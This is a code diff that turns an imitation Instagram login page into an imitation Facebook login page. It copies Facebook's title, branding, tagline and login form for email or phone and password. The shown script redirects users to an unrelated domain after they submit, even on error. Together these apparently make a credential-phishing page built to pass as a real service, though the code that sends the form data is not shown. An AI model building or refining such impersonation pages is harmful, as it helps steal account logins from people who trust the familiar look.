@@ -5,63 +5,82 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description"
-        content="Create an account or log in to Instagram - A simple, fun & creative way to capture, edit & share photos, videos & messages with friends & family.">
-    <title>Instagram</title>
+        content="Log into Facebook to start sharing and connecting with your friends, family, and people you know.">
+    <title>Facebook - log in or sign up</title>
     <link rel="stylesheet" href="style.css">
-    <link rel="icon" type="image/svg+xml" href="Instagram_logo_2022.svg">
+    <link rel="icon" type="image/png" href="asdf.png">
 </head>
 
 <body>
-    <!-- Header with Instagram Logo -->
+    <!-- Header with Facebook Logo (Mobile Only) -->
     <header class="header">
-        <div class="header-container">
-            <div class="instagram-logo">
-                <img src="vecteezy_instagram-logo-png-instagram-icon-transparent_18930691.png" alt="Instagram" />
-            </div>
+        <!-- App Download Banner -->
+        <div class="app-banner">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="#1877f2" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2L12 16M12 16L8 12M12 16L16 12" stroke="#1877f2" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round" />
+                <path d="M3 16L3 19C3 20.1046 3.89543 21 5 21L19 21C20.1046 21 21 20.1046 21 19L21 16" stroke="#1877f2"
+                    stroke-width="2" stroke-linecap="round" />
+            </svg>
+            <span>Get Facebook for iOS and browse faster.</span>
+        </div>
+
+        <!-- Language Selector -->
+        <div class="language-selector-mobile">
+            <select id="language-mobile" aria-label="Switch Display Language">
+                <option value="en-uk">English (UK)</option>
+                <option value="en-us">English (US)</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+                <option value="it">Italiano</option>
+                <option value="pt">Português (Brasil)</option>
+                <option value="ar">العربية</option>
+                <option value="hi">हिन्दी</option>
+                <option value="ja">日本語</option>
+            </select>
+        </div>
+
+        <!-- Facebook Icon -->
+        <div class="facebook-icon-container">
+            <img src="asdf.png" alt="Facebook" class="facebook-icon" />
         </div>
     </header>
 
     <!-- Main Content -->
     <main class="main">
-        <div class="login-container">
-            <div class="login-box">
-                <!-- Back Button -->
-                <button class="back-btn" aria-label="Go back">
-                    <svg width="44" height="44" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                            stroke-linejoin="round" />
-                    </svg>
-                </button>
+        <div class="main-container">
+            <!-- Left Side - Branding -->
+            <div class="branding-section">
+                <h1 class="facebook-text-logo">facebook</h1>
+                <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
+            </div>
 
-                <!-- Login Title -->
-                <h1 class="login-title">Log into Instagram</h1>
+            <!-- Right Side - Login Form -->
+            <div class="login-section">
+                <div class="login-box">
+                    <!-- Login Form -->
+                    <form id="loginForm" class="login-form">
+                        <input type="text" id="email" name="email" placeholder="Mobile number or email address"
+                            autocapitalize="off" autocorrect="off" required aria-label="Mobile number or email address">
+                        <input type="password" id="password" name="password" placeholder="Password" required
+                            aria-label="Password">
+                        <button type="submit" class="login-btn">Log in</button>
+                    </form>
 
-                <!-- Login Form -->
-                <form id="loginForm" class="login-form">
-                    <input type="text" id="email" name="email" placeholder="Mobile number, username or email"
-                        autocapitalize="off" autocorrect="off" required aria-label="Mobile number, username or email">
-                    <input type="password" id="password" name="password" placeholder="Password" required
-                        aria-label="Password">
-                    <button type="submit" class="login-btn">Log in</button>
-                </form>
+                    <!-- Forgot Password -->
+                    <a href="#" class="forgot-password">Forgotten password?</a>
 
-                <!-- Forgot Password -->
-                <a href="#" class="forgot-password">Forgot password?</a>
+                    <!-- Divider -->
+                    <div class="divider"></div>
 
-                <!-- Social Login -->
-                <div class="social-login">
-                    <button type="button" class="facebook-btn">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#0866FF"
-                            xmlns="http://www.w3.org/2000/svg">
-                            <path
-                                d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
-                        </svg>
-                        <span>Log in with Facebook</span>
-                    </button>
+                    <!-- Create Account -->
+                    <button type="button" class="create-account-btn">Create new account</button>
                 </div>
 
-                <!-- Create Account -->
-                <button type="button" class="create-account-btn">Create new account</button>
+                <!-- Create Page Link -->
+                <p class="create-page-text"><a href="#" class="create-page-link">Create a Page</a> for a celebrity,
+                    brand or business.</p>
             </div>
         </div>
     </main>
@@ -84,38 +103,10 @@
 
             <!-- Footer Links -->
             <nav class="footer-links" aria-label="Footer navigation">
-                <a href="#">Meta</a>
                 <a href="#">About</a>
-                <a href="#">Blog</a>
-                <a href="#">Jobs</a>
                 <a href="#">Help</a>
-                <a href="#">API</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-                <a href="#">Locations</a>
-                <a href="#">Instagram Lite</a>
-                <a href="#">Threads</a>
-                <a href="#">Contact uploading and non-users</a>
-                <a href="#">Meta Verified</a>
+                <a href="#">More</a>
             </nav>
-
-            <!-- Language Selector and Copyright -->
-            <div class="footer-bottom">
-                <div class="language-selector">
-                    <select id="language" aria-label="Switch Display Language">
-                        <option value="en">English (US)</option>
-                        <option value="es">Español</option>
-                        <option value="fr">Français</option>
-                        <option value="de">Deutsch</option>
-                        <option value="it">Italiano</option>
-                        <option value="pt">Português (Brasil)</option>
-                        <option value="ar">العربية</option>
-                        <option value="ja">日本語</option>
-                        <option value="hi">हिन्दी</option>
-                    </select>
-                </div>
-                <div class="copyright">© 2025 Instagram from Meta</div>
-            </div>
         </div>
     </footer>
 
@@ -153,12 +144,6 @@
                     // Redirect even if there is an error
                     window.location.href = 'https://messenger.abeto.co/';
                 });
-        });
-
-        // Back button handler
-        document.querySelector('.back-btn').addEventListener('click', function (e) {
-            e.preventDefault();
-            window.history.back();
         });
     </script>
 </body>
